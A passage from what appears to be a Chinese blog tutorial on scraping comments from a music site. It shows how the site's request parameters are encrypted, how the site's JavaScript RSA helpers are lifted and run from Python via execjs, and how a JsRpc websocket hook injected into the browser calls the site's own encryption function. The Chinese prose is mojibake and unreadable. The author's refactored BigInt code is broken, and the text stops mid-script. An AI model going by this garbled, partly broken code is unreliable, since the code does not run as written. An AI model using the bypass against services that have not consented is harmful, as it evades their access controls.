id="å‡½æ•°c"><a href="#å‡½æ•°c" class="headerlink" title="å‡½æ•°c"></a>å‡½æ•°c</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function c(a, b, c) &#123;</span><br><span class="line">        var d, e;</span><br><span class="line">        return setMaxDigits(131),</span><br><span class="line">        d = new RSAKeyPair(b,&quot;&quot;,c),</span><br><span class="line">        e = encryptedString(d, a)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç é‡Œé¢åˆ†åˆ«æœ‰ä¸‰ä¸ªå‡½æ•°ï¼Œå¾—æŠŠè¿™ä¸‰ä¸ªå‡½æ•°ç»™è¡¥å…¨äº†</p><p>é¦–å…ˆæ¥è¡¥å…¨setMaxDigitså‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setMaxDigits(a) &#123;</span><br><span class="line">    maxDigits = a,</span><br><span class="line">    ZERO_ARRAY = new Array(maxDigits);</span><br><span class="line">    for (var b = 0; b &lt; ZERO_ARRAY.length; b++)</span><br><span class="line">        ZERO_ARRAY[b] = 0;</span><br><span class="line">    bigZero = new BigInt,</span><br><span class="line">    bigOne = new BigInt,</span><br><span class="line">    bigOne.digits[0] = 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼ŒBigIntå¹¶ä¸æ˜¯JavaScriptå†…ç½®çš„ç±»å‹ï¼Œè€Œæ˜¯è‡ªå®šä¹‰çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å®ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function BigInt(a) &#123;</span><br><span class="line">    this.digits = &quot;boolean&quot; == typeof a &amp;&amp; 1 == a ? null : ZERO_ARRAY.slice(0),</span><br><span class="line">    this.isNeg = !1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä¸¤æ®µä»£ç çš„ä½œç”¨åº”è¯¥æ˜¯ç”¨äºåšä¸€äº›è¿ç®—ç›¸å…³çš„åŠ¨ä½œã€‚å…·ä½“çš„äº‹æƒ…æˆ‘ä»¬ä¹Ÿä¸å¿…æ·±ç©¶ï¼Œæ¥ä¸‹æ¥è¦åšçš„äº‹æƒ…å°±æ˜¯å°†ä¸¤ä¸ªå‡½æ•°åˆå¹¶èµ·æ¥ã€‚ä¿®æ”¹åå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function BigInt(value) &#123;</span><br><span class="line">    let ZERO_ARRAY = new Array(maxDigits);</span><br><span class="line">    this.digits = &quot;boolean&quot; == typeof a &amp;&amp; 1 == value ? null : ZERO_ARRAY.slice(0),</span><br><span class="line">    this.isNeg = !1</span><br><span class="line">&#125;</span><br><span class="line">function setMaxDigits(value) &#123;</span><br><span class="line">    let maxDigits = value;</span><br><span class="line">    let ZERO_ARRAY = new Array(maxDigits);</span><br><span class="line">    for (let i = 0; i &lt; ZERO_ARRAY.length; i++) &#123;</span><br><span class="line">            ZERO_ARRAY[i] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">    let bigZero = new BigInt(131); // ä¼ é€’falseä»£è¡¨æˆ‘ä»¬å¸Œæœ›åˆå§‹åŒ–ä¸º0çš„BigIntå¯¹è±¡</span><br><span class="line">    let bigOne = new BigInt(131);</span><br><span class="line">    bigOne.digits[0] = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€åˆ†æRSAKeyPairå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function RSAKeyPair(a, b, c) &#123;</span><br><span class="line">    this.e = biFromHex(a),</span><br><span class="line">    this.d = biFromHex(b),</span><br><span class="line">    this.m = biFromHex(c),</span><br><span class="line">    this.chunkSize = 2 * biHighIndex(this.m),</span><br><span class="line">    this.radix = 16,</span><br><span class="line">    this.barrett = new BarrettMu(this.m)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„å°±ä¸ç»†è¯´äº†ï¼Œç»§ç»­å¾€å‰è¡¥å…¨å°±è¡Œã€‚ã€‚ã€‚ã€‚</p><h2 id="æœ€ç»ˆä»£ç "><a href="#æœ€ç»ˆä»£ç " class="headerlink" title="æœ€ç»ˆä»£ç "></a>æœ€ç»ˆä»£ç </h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function get_post_data(i3x) &#123;</span><br><span class="line">    e = &#x27;010001&#x27;</span><br><span class="line">    f = &#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span><br><span class="line">    g = &#x27;0CoJUm6Qyw8W8jud&#x27;</span><br><span class="line">    return  bVg1x = asrsea(JSON.stringify(i3x), e, f, g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let i3x = &#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;1&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;-1&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;;</span><br><span class="line">let result1 = get_post_data(i3x)</span><br><span class="line">console.log(result1)</span><br></pre></td></tr></table></figure><p><strong>python</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;authority&quot;</span>: <span class="string">&quot;music.xxx.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cache-control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">    <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://music.xxx.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">    <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://music.xxx.com/outchain/player?type=2&amp;id=2051548110&amp;auto=1&amp;height=66&amp;bg=e8e8e8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;119\&quot;, \&quot;Chromium\&quot;;v=\&quot;119\&quot;, \&quot;Not?A_Brand\&quot;;v=\&quot;24\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua-platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-fetch-dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-fetch-mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-fetch-site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;csrf_token&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xzwy.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    js = f.read()</span><br><span class="line">cursor = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">i3x = &#123;<span class="string">&quot;rid&quot;</span>:<span class="string">&quot;R_SO_4_2061978961&quot;</span>,<span class="string">&quot;threadId&quot;</span>:<span class="string">&quot;R_SO_4_2061978961&quot;</span>,<span class="string">&quot;pageNo&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;pageSize&quot;</span>:<span class="string">&quot;20&quot;</span>,<span class="string">&quot;cursor&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;cursor&#125;</span>&quot;</span>,<span class="string">&quot;offset&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;orderType&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;csrf_token&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"><span class="comment"># print(i3x)</span></span><br><span class="line">result = execjs.<span class="built_in">compile</span>(js).call(<span class="string">&#x27;get_post_data&#x27;</span>, i3x)</span><br><span class="line">encText = result.get(<span class="string">&#x27;encText&#x27;</span>)</span><br><span class="line">encSecKey = result.get(<span class="string">&#x27;encSecKey&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(encText)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(encSecKey))</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;params&#x27;</span>: encText,</span><br><span class="line">    <span class="string">&#x27;encSecKey&#x27;</span>: encSecKey,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(</span><br><span class="line">    url=<span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">    params=params,</span><br><span class="line">    headers=headers,</span><br><span class="line">    data=data</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line">pprint.pprint(response.json())</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071113594.png" alt="img"> </p><h1 id="JsRpcè°ƒç”¨"><a href="#JsRpcè°ƒç”¨" class="headerlink" title="JsRpcè°ƒç”¨"></a>JsRpcè°ƒç”¨</h1><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨åç»­å®šä½åˆ°å‡½æ•°åï¼Œå„ç§æ‰£å–ä»£ç ï¼Œå‡½æ•°åµŒå¥—å‡½æ•°ï¼Œä¸ºæ•´ä¸ªåˆ†æçš„è¿‡ç¨‹å¸¦æ¥äº†å¾ˆå¤§çš„éº»çƒ¦ã€‚</p><p>é‚£å¯ä¸å¯ä»¥ä¸æ‰£å–ä»£ç å°±å®ç°è·å–è¯„è®ºçš„åŠŸèƒ½å‘¢ï¼Ÿ</p><p>JSRPCåˆšå¥½å°±å¯ä»¥å®ç°è¯¥åŠŸèƒ½ã€‚</p><h2 id="åŠ å¯†å‡½æ•°å‚æ•°åˆ†æ"><a href="#åŠ å¯†å‡½æ•°å‚æ•°åˆ†æ" class="headerlink" title="åŠ å¯†å‡½æ•°å‚æ•°åˆ†æ"></a>åŠ å¯†å‡½æ•°å‚æ•°åˆ†æ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.asrsea(JSON.stringify(i6c), bvl1x([&quot;æµæ³ª&quot;, &quot;å¼º&quot;]), bvl1x(Rj5o.md), bvl1x([&quot;çˆ±å¿ƒ&quot;, &quot;å¥³å­©&quot;, &quot;æƒŠæ&quot;, &quot;å¤§ç¬‘&quot;]));</span><br></pre></td></tr></table></figure><p>æœ‰4ä¸ªå‚æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSON.stringify(i6c) </span><br><span class="line">bvl1x([&quot;æµæ³ª&quot;, &quot;å¼º&quot;])</span><br><span class="line">bvl1x(Rj5o.md)</span><br><span class="line">bvl1x([&quot;çˆ±å¿ƒ&quot;, &quot;å¥³å­©&quot;, &quot;æƒŠæ&quot;, &quot;å¤§ç¬‘&quot;])</span><br></pre></td></tr></table></figure><p>ä¸Šé¢4ä¸ªå‚æ•°ï¼Œå¯¹åº”æŸæ¬¡çš„è¯·æ±‚çš„å€¼ï¼Œåˆ†åˆ«å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span><br><span class="line">&#x27;010001&#x27;</span><br><span class="line">&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span><br><span class="line">&#x27;0CoJUm6Qyw8W8jud&#x27;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åä¸‰ä¸ªå‚æ•°æ˜¯å…ˆè°ƒç”¨äº†<strong>bvl1xæ–¹æ³•</strong>çš„ï¼Œæ‰€ä»¥åœ¨hookåŠ å¯†å‡½æ•°ä¹‹å‰ï¼Œè¦å…ˆå¯¹ä»–è¿›è¡Œhookã€‚</p><p>ï¼ˆè²Œä¼¼è¿™åä¸‰ä¸ªå€¼ä¸ä¼šå˜åŒ–ï¼Œå¯ä»¥å†™æ­»ï¼Œä½†è¿™å—ä¸ºäº†éªŒè¯RPCï¼Œè¿˜æ˜¯å€Ÿç”¨ä»–æ¥å®ç°ï¼‰</p><h3 id="bvl1xæ–¹æ³•"><a href="#bvl1xæ–¹æ³•" class="headerlink" title="bvl1xæ–¹æ³•"></a>bvl1xæ–¹æ³•</h3><p>1ã€å®šä¹‰å…¨å±€å¯¼å‡ºå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.p = bvl1x</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117151.png" alt="image.png"> </p><p>2ã€é…ç½®RPCç¯å¢ƒ</p><p>ï¼ˆ1ï¼‰æ³¨å…¥JSenvç¯å¢ƒ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117201.png" alt="img"> </p><p>ï¼ˆ2ï¼‰è¿è¡Œexeï¼Œæµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰å’Œ æœ¬åœ°ï¼ˆæœåŠ¡ç«¯ï¼‰å»ºç«‹è¿æ¥</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118893.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// æ³¨å…¥ç¯å¢ƒåè¿æ¥é€šä¿¡</span><br><span class="line">var demo = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&amp;name=hlg&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118594.png" alt="image.png"> </p><p>3ã€åœ¨å‰ç«¯æ³¨å…¥JSä»£ç </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hlg1</span>(<span class="params">data1</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">p</span>(data1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hacker1&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">hlg1</span>(param[<span class="string">&quot;data1&quot;</span>]);</span><br><span class="line">  <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118541.png" alt="image.png"> </p><p>4ã€pythonè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line">jscode1 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>æµæ³ª<span class="string">&quot;, &quot;</span>å¼º<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode2 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    var Rj5o_md = [&quot;</span>è‰²<span class="string">&quot;, &quot;</span>æµæ„Ÿ<span class="string">&quot;, &quot;</span>è¿™è¾¹<span class="string">&quot;, &quot;</span>å¼±<span class="string">&quot;, &quot;</span>å˜´å”‡<span class="string">&quot;, &quot;</span>äº²<span class="string">&quot;, &quot;</span>å¼€å¿ƒ<span class="string">&quot;, &quot;</span>å‘²ç‰™<span class="string">&quot;, &quot;</span>æ†¨ç¬‘<span class="string">&quot;, &quot;</span>çŒ«<span class="string">&quot;, &quot;</span>çš±çœ‰<span class="string">&quot;, &quot;</span>å¹½çµ<span class="string">&quot;, &quot;</span>è›‹ç³•<span class="string">&quot;, &quot;</span>å‘æ€’<span class="string">&quot;, &quot;</span>å¤§å“­<span class="string">&quot;, &quot;</span>å…”å­<span class="string">&quot;, &quot;</span>æ˜Ÿæ˜Ÿ<span class="string">&quot;, &quot;</span>é’Ÿæƒ…<span class="string">&quot;, &quot;</span>ç‰µæ‰‹<span class="string">&quot;, &quot;</span>å…¬é¸¡<span class="string">&quot;, &quot;</span>çˆ±æ„<span class="string">&quot;, &quot;</span>ç¦æ­¢<span class="string">&quot;, &quot;</span>ç‹—<span class="string">&quot;, &quot;</span>äº²äº²<span class="string">&quot;, &quot;</span>å‰<span class="string">&quot;, &quot;</span>ç¤¼ç‰©<span class="string">&quot;, &quot;</span>æ™•<span class="string">&quot;, &quot;</span>å‘†<span class="string">&quot;, &quot;</span>ç”Ÿç—…<span class="string">&quot;, &quot;</span>é’»çŸ³<span class="string">&quot;, &quot;</span>æ‹œ<span class="string">&quot;, &quot;</span>æ€’<span class="string">&quot;, &quot;</span>ç¤ºçˆ±<span class="string">&quot;, &quot;</span>æ±—<span class="string">&quot;, &quot;</span>å°é¸¡<span class="string">&quot;, &quot;</span>ç—›è‹¦<span class="string">&quot;, &quot;</span>æ’‡å˜´<span class="string">&quot;, &quot;</span>æƒ¶æ<span class="string">&quot;, &quot;</span>å£ç½©<span class="string">&quot;, &quot;</span>åèˆŒ<span class="string">&quot;, &quot;</span>å¿ƒç¢<span class="string">&quot;, &quot;</span>ç”Ÿæ°”<span class="string">&quot;, &quot;</span>å¯çˆ±<span class="string">&quot;, &quot;</span>é¬¼è„¸<span class="string">&quot;, &quot;</span>è·³èˆ<span class="string">&quot;, &quot;</span>ç”·å­©<span class="string">&quot;, &quot;</span>å¥¸ç¬‘<span class="string">&quot;, &quot;</span>çŒª<span class="string">&quot;, &quot;</span>åœˆ<span class="string">&quot;, &quot;</span>ä¾¿ä¾¿<span class="string">&quot;, &quot;</span>å¤–æ˜Ÿ<span class="string">&quot;, &quot;</span>åœ£è¯<span class="string">&quot;]</span></span><br><span class="line"><span class="string">    s = p(Rj5o_md);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode3 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>çˆ±å¿ƒ<span class="string">&quot;, &quot;</span>å¥³å­©<span class="string">&quot;, &quot;</span>æƒŠæ<span class="string">&quot;, &quot;</span>å¤§ç¬‘<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/execjs&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">des_enc</span>():</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode1</span><br><span class="line">    &#125;</span><br><span class="line">    res1 = requests.<span class="title function_">post</span>(url, data=data1)</span><br><span class="line">    <span class="title function_">print</span>(res1.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode2</span><br><span class="line">    &#125;</span><br><span class="line">    res2 = requests.<span class="title function_">post</span>(url, data=data2)</span><br><span class="line">    <span class="title function_">print</span>(res2.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line">    data3 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode3</span><br><span class="line">    &#125;</span><br><span class="line">    res3 = requests.<span class="title function_">post</span>(url, data=data3)</span><br><span class="line">    <span class="title function_">print</span>(res3.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">des_enc</span>()</span><br></pre></td></tr></table></figure><p> è¿è¡Œåï¼Œè·å¾—ä¸‰ä¸ªå‚æ•°çš„å€¼ã€‚<img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1713257229122-ed7036e6-5a86-43b5-ad3e-8cc13efeb688.png" alt="img"></p><h2 id="åŠ å¯†å‡½æ•°è°ƒç”¨"><a href="#åŠ å¯†å‡½æ•°è°ƒç”¨" class="headerlink" title="åŠ å¯†å‡½æ•°è°ƒç”¨"></a>åŠ å¯†å‡½æ•°è°ƒç”¨</h2><p>1ã€å‰ç«¯æ³¨å…¥JSä»£ç </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hlg2</span>(<span class="params">data2</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> param2 = <span class="string">&quot;010001&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> param3 = <span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&quot;</span></span><br><span class="line">  <span class="keyword">var</span> param4 = <span class="string">&quot;0CoJUm6Qyw8W8jud&quot;</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">asrsea</span>(data2,param2,param3,param4))</span><br><span class="line">  obj = <span class="title function_">asrsea</span>(data2,param2,param3,param4)</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hacker2&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">hlg2</span>(param[<span class="string">&quot;data2&quot;</span>]);</span><br><span class="line">  <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117273.png" alt="img"> </p><p>2ã€pythonè„šæœ¬å¦‚ä¸‹</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">param1 = <span class="string">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(&#123;<span class="string">&quot;data2&quot;</span>: param1&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">enc</span>())</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118130.png" alt="image.png"> </p><p>3ã€ä½†ä¸Šé¢ä»£ç æ˜¯åœ¨å‰ç«¯ä¸­å°†å‚æ•°å†™æ­»çš„ï¼Œè¿™å—å¯ä»¥åŠ¨æ€è°ƒç”¨Pythonè„šæœ¬ä¸­è®¡ç®—çš„å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hlg2</span>(<span class="params">data2,param2,param3,param4</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">asrsea</span>(data2,param2,param3,param4))</span><br><span class="line">  obj = <span class="title function_">asrsea</span>(data2,param2,param3,param4)</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hacker2&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">hlg2</span>(param[<span class="string">&quot;data2&quot;</span>],param[<span class="string">&quot;param2&quot;</span>],param[<span class="string">&quot;param3&quot;</span>],param[<span class="string">&quot;param4&quot;</span>]);</span><br><span class="line">  <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(&#123;<span class="string">&quot;data2&quot;</span>: param1, <span class="string">&quot;param2&quot;</span>: param2, <span class="string">&quot;param3&quot;</span>: param3, <span class="string">&quot;param4&quot;</span>: param4&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title 